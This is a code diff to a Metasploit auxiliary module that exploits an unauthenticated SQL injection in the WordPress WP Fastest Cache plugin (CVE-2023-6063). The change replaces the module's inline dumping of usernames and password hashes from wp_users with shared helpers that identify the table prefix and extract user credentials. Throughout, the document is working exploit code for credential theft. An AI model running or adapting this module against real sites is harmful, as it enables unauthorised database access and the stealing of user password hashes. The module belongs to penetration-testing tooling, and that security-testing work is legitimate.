@@ -4,15 +4,15 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::SQLi
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'Wordpress WP Fastest Cache Unauthenticated SQLi (CVE-2023-6063)',
+        'Name' => 'WordPress WP Fastest Cache Unauthenticated SQLi (CVE-2023-6063)',
         'Description' => %q{
           WP Fastest Cache, a WordPress plugin,
           prior to version 1.2.2, is vulnerable to an unauthenticated SQL injection
@@ -41,6 +41,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
+
     register_options [
       OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
     ]
@@ -62,47 +63,15 @@ class MetasploitModule < Msf::Auxiliary
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
 
+    wordpress_sqli_initialize(@sqli)
+
     return print_bad("#{peer} - Testing of SQLi failed. If this is time-based, try increasing the SqliDelay.") unless @sqli.test_vulnerable
 
-    columns = ['user_login', 'user_pass']
-
-    print_status('Enumerating Usernames and Password Hashes')
-    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
-
-    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 4, 'Columns' => columns)
-    loot_data = ''
-
-    data.each do |user|
-      create_credential({
-        workspace_id: myworkspace_id,
-        origin_type: :service,
-        module_fullname: fullname,
-        username: user[0],
-        private_type: :nonreplayable_hash,
-        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
-        private_data: user[1],
-        service_name: 'Wordpress',
-        address: ip,
-        port: datastore['RPORT'],
-        protocol: 'tcp',
-        status: Metasploit::Model::Login::Status::UNTRIED
-      })
-      table << user
-      loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
+    table_prefix = wordpress_sqli_identify_table_prefix
+    unless table_prefix
+      fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
     end
 
-    print_good('Dumped table contents:')
-    print_line(table.to_s)
-
-    loot_path = store_loot(
-      'wordpress.users',
-      'text/plain',
-      ip,
-      loot_data,
-      'wp_users.txt',
-      'WordPress Usernames and Password Hashes'
-    )
-
-    print_good("Loot saved to: #{loot_path}")
+    wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
   end
 end
